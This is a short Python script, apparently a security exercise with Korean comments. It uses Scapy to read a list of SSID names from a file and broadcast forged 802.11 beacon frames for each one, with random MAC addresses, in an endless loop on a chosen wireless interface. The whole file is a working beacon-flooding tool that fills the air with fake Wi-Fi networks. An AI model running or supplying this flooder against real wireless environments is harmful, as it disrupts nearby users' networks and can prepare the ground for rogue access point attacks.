from multiprocessing import Process
from scapy.all import *
from dataclasses import dataclass
import sys
import random


#mac 주소 랜덤 생성
def random_mac_address():
    mac = [ random.randint(0x00, 0x7f),
     	random.randint(0x00, 0x7f),
     	random.randint(0x00, 0x7f),
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff) ]
    return ':'.join(map(lambda x: "%02x" % x, mac))

#비콘 구조체
@dataclass
class beacon:
	src_mac: str = ''
	dst_mac: str = "ff:ff:ff:ff:ff:ff"
	ssid_name: str =''
	rates_info: str ='\x82\x84\x8b\x96\x24\x30\x48\x6c'
	DSet_info: str = '\x03'

interface=sys.argv[1]	#네트워크 인터페이스	
ssid_path = sys.argv[2]	#ssid 명이 적힌 파일 이름

#SSID 읽어서 리스트화
p=open(	'{}'.format(ssid_path), 'r', encoding='utf-8-sig')
ssid=p.readlines()
pure_ssid=[]
for i in range(len(ssid)):
	pure_ssid.append(ssid[i].replace("\n",""))

#비콘 프레임 제작
beacon_list=[]
for i in range(len(pure_ssid)):
	fake = beacon()
	fake.ssid_name=pure_ssid[i]
	fake.src_mac=random_mac_address()
	beac0 = RadioTap()/Dot11(type=0, subtype=8, addr1=fake.dst_mac, addr2=fake.src_mac, addr3=fake.src_mac)/Dot11Beacon(cap='ESS+privacy')/Dot11Elt(ID="SSID",info=fake.ssid_name)/Dot11Elt(ID="Rates",info=fake.rates_info)/Dot11Elt(ID="DSset",info=fake.DSet_info)
	beacon_list.append(beac0)

#생성한 비콘 돌아가면서 3개 패킷씩 무한 발신
def beacon0():
	# Send the beacon frame
	while True:
		for i in range(len(pure_ssid)):
			sendp(beacon_list[i], iface=interface, count=3, inter=.0000001)

p0 = Process(target=beacon0())
p0.start()
